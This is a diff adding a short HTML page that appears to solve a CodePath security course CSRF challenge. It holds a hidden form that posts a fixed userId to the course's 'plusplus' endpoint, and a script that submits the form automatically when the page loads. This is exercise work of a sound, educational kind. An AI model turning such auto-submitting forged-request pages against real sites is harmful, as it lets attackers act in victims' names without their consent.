@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF2</title>
+</head>
+
+<body>
+    <h1>Hello!</h1>
+    <form name="csrfForm" action="http://security.codepath.com/user/csrfchallengetwo/plusplus" method="POST">
+        <input type="hidden" name="userId" value="4061f1d49c853eff33ed40969d32a19ed7abe934" />
+        <input type="submit" />
+    </form>
+    <script>
+        document.csrfForm.submit();
+    </script>
+</body>
+
+</html>
